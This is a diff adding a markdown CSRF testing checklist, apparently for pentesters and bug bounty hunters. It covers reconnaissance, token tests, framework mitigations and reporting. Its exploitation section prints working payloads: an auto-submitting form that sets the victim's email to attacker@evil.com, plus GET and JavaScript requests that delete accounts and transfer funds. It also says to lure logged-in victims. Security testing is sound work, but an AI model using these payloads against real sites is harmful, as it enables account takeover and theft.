@@ -1,0 +1,129 @@
+## ✅ COMPLETE CSRF CHECKLIST (Step-by-Step)
+
+---
+
+### 📌 **1. Reconnaissance – Finding Vulnerable Targets**
+
+- [ ] Identify **state-changing endpoints**:
+  - Actions like: change password, change email, delete account, transfer funds, update profile.
+  - HTTP methods: Mostly `POST`, sometimes `GET` (in poorly coded apps).
+- [ ] Confirm **authentication is required** to access these endpoints.
+- [ ] Note the form details:
+  - URL
+  - Method (GET/POST)
+  - Parameters
+  - Any hidden CSRF tokens or cookies
+
+---
+
+### 🔍 **2. Test CSRF Protections**
+
+#### 2.1 **Check for CSRF Token**
+- [ ] Is a CSRF token present in the form or headers?
+- [ ] Is it unique per session or per request?
+- [ ] Is the token:
+  - Present in the **form body**?
+  - Sent in **custom headers**?
+- [ ] Try submitting the request **without the token** – does it still go through?
+
+#### 2.2 **Test Token Validation**
+- [ ] Replace the token with:
+  - Empty string
+  - Previous token
+  - Random string
+- [ ] See if the request is accepted
+
+---
+
+### 🧪 **3. Manual CSRF Exploitation**
+
+#### 3.1 **Basic HTML Exploit (If CSRF is Possible)**
+Create an auto-submitting HTML page:
+```html
+<form action="https://target.com/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="submit">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+- [ ] Host this page on your own domain.
+- [ ] Have the victim visit the page **while logged in** to the target.
+
+#### 3.2 **GET-based CSRF**
+```html
+<img src="https://target.com/delete-account?id=123">
+```
+
+- [ ] Check if any state-changing GET requests are vulnerable.
+
+#### 3.3 **CSRF via Image or JS injection**
+Try alternative vectors like:
+```html
+<script>new Image().src="https://target.com/transfer?to=attacker&amount=1000"</script>
+```
+
+---
+
+### 📦 **4. Advanced CSRF Techniques**
+
+- [ ] **Multipart/Form-data CSRF**
+  - Use `<input type="file">` and `enctype="multipart/form-data"` in exploit.
+- [ ] **JSON-based CSRF**
+  - JSON CSRF only works if:
+    - Server accepts `application/json` from cross-origin.
+    - There’s no CORS policy or CSRF header requirement.
+
+- [ ] **SameSite Cookie Bypass**
+  - Check if the app uses SameSite=Strict or Lax.
+  - If not, browser may send cookies across domains.
+
+- [ ] **Using iframes / Fetch to test modern protections**:
+  ```javascript
+  fetch("https://target.com/api/update", {
+    method: "POST",
+    body: "param=value",
+    credentials: "include"
+  })
+  ```
+
+---
+
+### 🚫 **5. Mitigation & Defense Checklist**
+
+#### ✅ For Developers
+
+- [ ] Use **CSRF tokens** – per session or per form.
+- [ ] Verify **Referer / Origin** headers (not foolproof, but helpful).
+- [ ] Enforce **SameSite cookies**:
+  - `SameSite=Lax` or `Strict`
+- [ ] Use **custom headers** (`X-CSRF-Token`) with JavaScript requests (harder to send cross-origin).
+- [ ] For APIs, enforce **CORS with strict Origin checks**.
+
+#### 🔐 Framework Tips
+
+- [ ] Ensure CSRF protection is **enabled by default** in frameworks:
+  - Django: `@csrf_protect`
+  - Laravel: `VerifyCsrfToken`
+  - Express (Node): `csurf` middleware
+  - Flask: `Flask-WTF` CSRF protection
+
+---
+
+### 🧾 **6. Reporting (Bug Bounties / Pentests)**
+
+- [ ] Clear steps to reproduce
+- [ ] POC code (HTML/JS)
+- [ ] Impact assessment (What can attacker do?)
+- [ ] Affected endpoints and parameters
+- [ ] Screenshot/video evidence
+- [ ] Suggested mitigation steps
+
+---
+
+### 🧠 Bonus Tips
+
+- [ ] Always test CSRF with **logged-in sessions**
+- [ ] Try to exploit CSRF from **another domain**
+- [ ] Consider **clickjacking + CSRF** for chained attacks
+- [ ] Look for **API endpoints** missing CSRF protections
